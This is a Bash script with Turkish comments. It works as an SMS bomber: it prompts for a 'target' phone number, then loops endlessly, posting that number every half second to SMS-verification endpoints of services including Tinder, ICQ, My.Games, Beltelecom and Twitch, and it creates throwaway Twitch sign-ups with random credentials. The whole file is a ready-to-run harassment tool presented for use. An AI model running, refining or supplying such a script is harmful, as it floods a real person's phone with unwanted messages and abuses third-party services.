#!/bin/bash

# Kullanıcıdan telefon numarası girmesini ister
read -p 'Enter Target Phone Number Without (+): ' phone

# Rastgele kullanıcı adı ve şifre oluşturur
generate_random_string() {
    tr -dc 'A-Za-z0-9' </dev/urandom | head -c 12
}

name=$(generate_random_string)
password="${name}$(generate_random_string)"
username="${name}$(generate_random_string)"

numplus="+$phone"

# Renk kodları
colors=( "\033[1;31m" "\033[1;32m" "\033[1;33m" "\033[1;34m" "\033[1;35m" "\033[1;36m" )
color=${colors[$RANDOM % ${#colors[@]}]}

# Çıktı dosyası
log_file="request_log.txt"

# Başlangıçta log dosyasını temizle
> "$log_file"

# İşlemi durdurmak için tuş kombinasyonu
trap 'echo "Process interrupted by user."; exit 0' SIGINT

while true; do
    for url in \
        "https://youla.ru/web-api/auth/request_code" \
        "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru" \
        "https://www.icq.com/smsreg/requestPhoneValidation.php?msisdn=$phone&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763" \
        "https://account.my.games/signup_send_sms/" \
        "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru" \
        "https://passport.twitch.tv/register?trusted_request=true"
    do
        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        echo -e "$color[$timestamp] Sending request to $url"

        case "$url" in
            *"twitch.tv"*)
                response=$(curl -s -w "%{http_code}" -o temp_response.txt -X POST "$url" -H 'Content-Type: application/json' -d "{\"birthday\":{\"day\":11,\"month\":11,\"year\":1999},\"client_id\":\"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\",\"include_verification_code\":true,\"password\":\"$password\",\"phone_number\":\"$phone\",\"username\":\"$username\"}")
                ;;
            *)
                response=$(curl -s -w "%{http_code}" -o temp_response.txt -X POST "$url" -H 'Content-Type: application/json' -d "{\"phone\":\"$numplus\"}")
                ;;
        esac

        http_code=$(tail -n 1 temp_response.txt)
        response_body=$(head -n -1 temp_response.txt)

        echo -e "$color[$timestamp] HTTP Status Code: $http_code"
        echo "$response_body"
        echo "[$timestamp] URL: $url" >> "$log_file"
        echo "HTTP Status Code: $http_code" >> "$log_file"
        echo "Response Body: $response_body" >> "$log_file"
        echo "--------------------------------------" >> "$log_file"

        sleep 0.5
    done

    # Renk değişimi
    color=${colors[$RANDOM % ${#colors[@]}]}
    echo -e "$color"
done
